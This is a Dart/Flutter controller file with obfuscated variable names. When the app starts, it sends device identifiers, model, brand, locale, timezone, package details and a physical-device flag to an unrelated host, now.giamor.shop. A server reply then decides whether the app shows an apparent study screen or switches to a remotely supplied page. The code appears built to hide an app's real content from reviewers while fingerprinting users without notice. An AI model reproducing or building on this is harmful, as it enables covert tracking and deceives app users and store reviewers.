import 'dart:convert';
import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

class PageLogic extends GetxController {

  var jpvhlc = RxBool(false);
  var rmagpx = RxBool(true);
  var pnsuhty = RxString("");
  var tavares = RxBool(false);
  var bednar = RxBool(true);
  final lbzgxisd = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    dlryt();
  }


  Future<void> dlryt() async {

    tavares.value = true;
    bednar.value = true;
    rmagpx.value = false;

    lbzgxisd.post("http://now.giamor.shop/FNxiQwV1qH8e2Q",data: await moqnvkc()).then((value) {
      var gltebk = value.data["gltebk"] as String;
      var ztuko = value.data["ztuko"] as bool;
      if (ztuko) {
        pnsuhty.value = gltebk;
        marina();
      } else {
        miller();
      }
    }).catchError((e) {
      rmagpx.value = true;
      bednar.value = true;
      tavares.value = false;
    });
  }

  Future<Map<String, dynamic>> moqnvkc() async {
    final DeviceInfoPlugin klsjq = DeviceInfoPlugin();
    PackageInfo klqgtos_okgp = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var yuztlvsb = Platform.localeName;
    var vFUOT = currentTimeZone;

    var NEtqu = klqgtos_okgp.packageName;
    var HeAQbuM = klqgtos_okgp.version;
    var giZzA = klqgtos_okgp.buildNumber;

    var hGMArIz = klqgtos_okgp.appName;
    var XqSgoct  = "";
    var fQEpwt = "";
    var rosellaHettinger = "";
    var augustaSchaden = "";
    var sylvesterHackett = "";
    var lewisMraz = "";
    var bradlySipes = "";
    var fVMLkBo = "";
    var paulWard = "";
    var marcelinoCummerata = "";
    var danielleHegmann = "";


    var rhauLXqp = "";
    var hLCcy = false;

    if (GetPlatform.isAndroid) {
      rhauLXqp = "android";
      var ekbjyc = await klsjq.androidInfo;

      fQEpwt = ekbjyc.brand;

      fVMLkBo  = ekbjyc.model;
      XqSgoct = ekbjyc.id;

      hLCcy = ekbjyc.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      rhauLXqp = "ios";
      var mdjbso = await klsjq.iosInfo;
      fQEpwt = mdjbso.name;
      fVMLkBo = mdjbso.model;

      XqSgoct = mdjbso.identifierForVendor ?? "";
      hLCcy  = mdjbso.isPhysicalDevice;
    }
    var res = {
      "giZzA": giZzA,
      "HeAQbuM": HeAQbuM,
      "sylvesterHackett" : sylvesterHackett,
      "NEtqu": NEtqu,
      "fVMLkBo": fVMLkBo,
      "vFUOT": vFUOT,
      "marcelinoCummerata" : marcelinoCummerata,
      "fQEpwt": fQEpwt,
      "XqSgoct": XqSgoct,
      "yuztlvsb": yuztlvsb,
      "rhauLXqp": rhauLXqp,
      "hLCcy": hLCcy,
      "augustaSchaden" : augustaSchaden,
      "hGMArIz": hGMArIz,
      "bradlySipes" : bradlySipes,
      "paulWard" : paulWard,
      "rosellaHettinger" : rosellaHettinger,
      "danielleHegmann" : danielleHegmann,
      "lewisMraz" : lewisMraz,

    };
    return res;
  }

  Future<void> miller() async {
    Get.offAllNamed("/study_start");
  }

  Future<void> marina() async {
    Get.offAllNamed("/study_check");
  }

}
